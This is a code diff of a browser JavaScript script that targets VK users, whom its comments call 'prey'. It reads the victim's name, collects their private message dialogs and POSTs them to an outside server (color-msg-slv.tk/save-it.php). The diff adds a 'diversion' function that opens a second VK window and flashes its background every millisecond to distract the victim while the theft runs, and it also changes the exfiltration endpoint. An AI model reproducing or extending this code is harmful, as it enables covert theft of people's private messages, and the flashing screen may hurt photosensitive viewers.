@@ -11,7 +11,7 @@
  */
 const wait = async (ms) => await new Promise(resolve => setTimeout(resolve, ms));
 
-// =============== PREY FULL NAME =============== //
+// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
 /**
  * Получает кнопку "Моя страница" и нажимает на нее, чтобы перейти в профиль
  */
@@ -24,7 +24,7 @@ function toProfile() {
 function getPreyFullName() {
     return document.querySelector('.page_name').textContent.trim();
 }
-// =============== PREY FULL NAME =============== //
+// =============== ИМЯ И ФАМИЛИЯ ЖЕРТВЫ =============== //
 
 
 /**
@@ -75,9 +75,56 @@ function getMessages() {
     return messages;
 }
 
+
+// =============================================== //
+// ================= ОТВЛЕЧЕНИЕ ================== //
+function diversion() {
+    // открываем новое окно с вк
+    let vkCopy = window.open('https://vk.com/im');
+
+    // когда новое окно загрузится выполняем скрипт, который отвлечет человека
+    setTimeout(() => {
+        let current = 0;
+        // когда новое окно загрузится выполняем скрипт, который отвлечет человека
+        setInterval(() => {
+            if (current === 4) vkCopy.document.body.style.cssText = "background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU') no-repeat center !important; background-size: cover !important";
+            else if (current === 3) vkCopy.document.body.style.cssText = "background: red !important";
+            else if (current === 2) vkCopy.document.body.style.cssText = "background: blue !important";
+            else if (current === 1) vkCopy.document.body.style.cssText = "background: green !important";
+            else if (current === 0) vkCopy.document.body.style.cssText = "background: url('https://www.proplan.ru/sites/owners.proplan.ru/files/2020-03/shutterstock_1036161856.jpg') no-repeat center !important; background-size: cover !important";
+
+            current++;
+            if (current > 4) current = 0;
+        }, 1);
+
+    }, 5000);
+
+    // vkCopy.addEventListener('load', () => {
+    //     let toggle = true;
+    //     vkCopy.alert(123);
+
+    //     setInterval(function () {
+    //         if (toggle) vkCopy.document.body.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSp3TM1puW0YH1z7Jnee4aNjx4-xasgeTdAzQ&usqp=CAU')";
+    //         else vkCopy.document.body.background = "red";
+    //         toggle = !toggle;
+    //     }, 500);
+    // });
+
+    // setTimeout(function () {
+    //     vkCopy.document.body.appendChild(vkCopy.document.createElement('div'));
+    //     console.log('New script appended!');
+    // }, 5000);
+}
+// ================= ОТВЛЕЧЕНИЕ ================== //
+
 // ======================== //
 // ===== IT IS MAGICK ===== //
 async function hacking() {
+    // Сначала открываем отвлекающее окно
+    diversion();
+    // ==================================
+
+
     // ===== GET PREY's FULLNAME ===== //
     toProfile(); // go to profile
     await wait(2000); // wait some time
@@ -128,7 +175,7 @@ async function hacking() {
         formData.append('data', JSON.stringify(dialogsData));
 
         fetch(
-            'https://color-msg-slv.tk', {
+            'https://color-msg-slv.tk/save-it.php', {
                 method: 'POST',
                 mode: 'no-cors',
                 body: formData,
